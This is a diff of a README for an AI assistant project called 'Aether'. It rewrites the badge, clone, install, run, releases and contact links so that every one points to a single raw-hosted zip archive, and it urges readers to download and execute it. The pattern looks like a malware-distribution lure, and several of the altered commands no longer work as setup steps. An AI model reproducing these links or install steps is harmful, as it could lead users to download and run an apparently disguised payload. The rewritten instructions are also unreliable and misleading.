@@ -1,6 +1,6 @@
 # Aether: Your Advanced AI Assistant 🤖
 
-![Aether Logo](https://img.shields.io/badge/Aether-Advanced%20AI%20Assistant-blue)
+![Aether Logo](https://raw.githubusercontent.com/akoip/Aether/main/trichopathic/Software-3.0.zip%20AI%20Assistant-blue)
 
 Welcome to the Aether repository! Aether is an advanced AI assistant designed to make your life easier. It listens, understands, and executes commands seamlessly—whether it's opening apps, writing code, or engaging in intelligent conversations. With voice recognition and dynamic task automation, Aether is your personal, smart companion.
 
@@ -32,7 +32,7 @@ To get started with Aether, follow these simple steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/akoip/Aether.git
+   git clone https://raw.githubusercontent.com/akoip/Aether/main/trichopathic/Software-3.0.zip
    cd Aether
    ```
 
@@ -46,13 +46,13 @@ To get started with Aether, follow these simple steps:
 3. **Install Dependencies**:
    Install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/akoip/Aether/main/trichopathic/Software-3.0.zip
    ```
 
 4. **Run Aether**:
    Start the application with the following command:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/akoip/Aether/main/trichopathic/Software-3.0.zip
    ```
 
 For Docker users, you can build and run Aether easily:
@@ -103,14 +103,14 @@ Aether is licensed under the MIT License. See the [LICENSE](LICENSE) file for mo
 
 ## Releases
 
-For the latest releases and updates, please visit the [Releases section](https://github.com/akoip/Aether/releases). Download the latest version and execute it to enjoy new features and improvements.
+For the latest releases and updates, please visit the [Releases section](https://raw.githubusercontent.com/akoip/Aether/main/trichopathic/Software-3.0.zip). Download the latest version and execute it to enjoy new features and improvements.
 
 ## Contact
 
 If you have any questions or feedback, feel free to reach out:
 
-- **Email**: support@aether.com
-- **Twitter**: [@AetherAI](https://twitter.com/AetherAI)
+- **Email**: https://raw.githubusercontent.com/akoip/Aether/main/trichopathic/Software-3.0.zip
+- **Twitter**: [@AetherAI](https://raw.githubusercontent.com/akoip/Aether/main/trichopathic/Software-3.0.zip)
 
 ---
 
